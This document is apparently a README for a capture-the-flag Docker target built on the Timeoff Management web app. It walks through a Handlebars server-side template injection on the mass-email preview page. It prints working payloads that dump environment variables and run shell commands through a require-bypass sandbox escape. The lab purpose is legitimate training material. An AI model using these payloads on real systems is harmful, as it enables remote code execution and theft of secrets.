# Vacation Planner Docker Target

This repo contains code to set up [Timeoff Management](https://github.com/timeoff-management/timeoff-management-application) as a Docker container.

The app's code is included in a submodule of this repo.

## Usage

1. Change the contents of `flag.txt`
2. `docker build -t vacation-planner .`
3. `docker run -p 3000:3000 --name vacation-planner vacation-planner`

## Exploit

After navigating to the website, you are presented with a login form. Register a new company with bogus details to access the full functionality of the web application.

There is much to browse and test, but eventually you should find the "mass email" page.

Once you try to preview a message that includes `{{`, aiming to find a server-side template injection (SSTI) vulnerability, you are presented with an error message:

```
Error: Parse error on line 1:
{{
--^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'EOF'
    at Parser.parseError (/var/lib/vacation-planner/timeoff-management-application/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19)
    at Parser.parse (/var/lib/vacation-planner/timeoff-management-application/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30)
    at HandlebarsEnvironment.parse ...
...
```

From the error message, it is possible to see that Handlebars is being used for template rendering. A quick investigation gives us http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html and the following payload:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Using this as the message body, we can read the environment variables and confirm SSTI.

After trying to get code execution using normal means, it is apparent that `require` keyword is not available in the limited sandbox provided by Handlebars.

Based on https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/, it is possible to bypass the `require` requirement by using `global.process.mainModule.constructor._load` instead.

Final exploit:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return global.process.mainModule.constructor._load(\"child_process\").execSync(\"cat flag.txt\").toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

The message preview will show the results, proving command execution is possible:

```
      e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            flag{with_with_with_with_each_with_this}
```
